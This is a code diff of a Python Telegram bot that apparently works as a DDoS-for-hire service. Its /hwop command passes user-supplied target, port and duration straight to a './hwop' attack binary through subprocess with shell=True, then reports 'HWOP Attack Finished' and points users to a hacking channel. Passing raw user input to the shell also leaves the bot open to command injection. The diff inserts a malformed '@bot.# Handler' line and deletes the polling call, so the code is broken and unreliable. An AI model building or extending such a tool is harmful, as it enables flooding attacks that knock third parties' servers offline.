@@ -309,6 +309,7 @@ hwop_cooldown = {}
 COOLDOWN_TIME = 2700
 
 # Handler for /hwop command
+@bot.# Handler for /hwop command
 @bot.message_handler(commands=['hwop'])
 def handle_hwop(message):
     user_id = str(message.chat.id)
@@ -327,15 +328,21 @@ def handle_hwop(message):
             if time > 121:
                 response = "Error: Time interval must be less than 120."
             else:
-                start_time, end_time = parse_time_range(fetch_time_range())
-                current_time = datetime.datetime.now().time()
-                if start_time <= current_time <= end_time:
-                    start_attack_reply_hwop(message, target, port, time)
-                    full_command = f"./hwop {target} {port} {time} 800"
-                    subprocess.run(full_command, shell=True)
-                    response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
+                time_range = fetch_time_range()
+                if time_range:
+                    start_time_str, end_time_str = time_range.split(" to ")
+                    start_time = datetime.datetime.strptime(start_time_str, "%I:%M %p").time()
+                    end_time = datetime.datetime.strptime(end_time_str, "%I:%M %p").time()
+                    current_time = datetime.datetime.now().time()
+                    if start_time <= current_time <= end_time:
+                        start_attack_reply_hwop(message, target, port, time)
+                        full_command = f"./hwop {target} {port} {time} 800"
+                        subprocess.run(full_command, shell=True)
+                        response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
+                    else:
+                        response = "Command time is changed. Join @HackerWorldMods for updates."
                 else:
-                    response = "Command time is changed. Join @HackerWorldMods for updates."
+                    response = "Failed to fetch time range. Please try again later."
         else:
             response = "✅ Usage :- /hwop <target> <port> <time>"
     else:
@@ -343,7 +350,6 @@ def handle_hwop(message):
 
     bot.reply_to(message, response)
 
-bot.polling()
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
